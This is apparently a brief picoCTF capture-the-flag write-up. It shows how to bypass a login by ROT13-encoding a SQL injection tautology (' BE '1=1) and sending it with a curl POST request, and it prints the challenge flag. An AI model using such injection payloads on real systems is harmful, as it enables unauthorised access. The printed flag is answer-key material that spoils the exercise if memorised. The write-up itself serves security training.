# Solution

Admin page only requires us to key in the password.

When we enable `debug=1`, we see that the generated SQL is encrypted.

```
aaa -> nnn # This is a classic ROT13 cipher
```

Let's encrypt our SQL text using ROT13 to get `' BE '1=1`

Create a new POST request with our encrypted text.

```
$ curl 'https://jupiter.challenges.picoctf.org/problem/29132/login.php' --data "password=' BE '1=1&debug=1"
```

And our flag `picoCTF{3v3n_m0r3_SQL_06a9db19}`